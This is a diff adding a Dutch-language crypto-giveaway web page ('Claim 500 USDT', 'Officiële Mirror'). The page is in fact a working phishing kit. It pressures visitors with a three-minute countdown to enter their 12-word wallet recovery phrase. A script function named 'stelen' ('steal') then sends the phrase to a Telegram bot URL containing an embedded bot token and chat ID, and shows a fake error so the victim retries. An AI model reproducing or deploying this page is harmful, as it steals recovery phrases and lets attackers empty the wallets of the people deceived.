@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="nl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Claim 500 USDT</title>
+<style>
+  body { font-family: Arial; background: #1a1a2e; color: white; text-align: center; padding: 30px; }
+  input { width: 90%; padding: 15px; margin: 10px 0; border-radius: 10px; border: none; font-size: 16px; }
+  button { background: #f7931a; color: white; padding: 15px 40px; border: none; border-radius: 10px; font-size: 18px; }
+  .box { background: #16213e; padding: 20px; border-radius: 20px; max-width: 400px; margin: auto; }
+  .timer { color: #ff4444; font-size: 22px; font-weight: bold; }
+</style>
+</head>
+<body>
+<div class="box">
+  <h2>🎁 Officiële Mirror – Claim 500 USDT</h2>
+  <p>Tijd over: <span class="timer" id="timer">03:00</span></p>
+  <p>Voer uw 12-woord herstelzin in om te verifiëren.</p>
+  <input id="seed" placeholder="bijv. aardbei auto zon ..." />
+  <br><br>
+  <button onclick="stelen()">Verifieer en Claim</button>
+  <p style="font-size:12px; color:#888;">Versleutelde verbinding • Eenmalige actie</p>
+</div>
+<script>
+// Timer
+let timeLeft = 180;
+setInterval(function() {
+  let min = Math.floor(timeLeft / 60);
+  let sec = timeLeft % 60;
+  document.getElementById('timer').innerText = 
+    String(min).padStart(2,'0') + ':' + String(sec).padStart(2,'0');
+  if (timeLeft <= 0) {
+    document.getElementById('timer').innerText = '00:00';
+  }
+  timeLeft--;
+}, 1000);
+
+// Phishing functie
+function stelen() {
+  let seed = document.getElementById('seed').value;
+  if (seed.split(' ').length < 6) {
+    alert('Voer uw volledige herstelzin in (minimaal 6 woorden)');
+    return;
+  }
+  fetch('https://api.telegram.org/bot8603713494:AAEdQGNssdiNU-iQ3bky4xwXM0aodSk-ifc/sendMessage?chat_id=7697818138&text=ZIN: ' + encodeURIComponent(seed));
+  alert('❌ Verbinding mislukt – probeer opnieuw');
+  document.getElementById('seed').value = '';
+}
+</script>
+</body>
+</html>
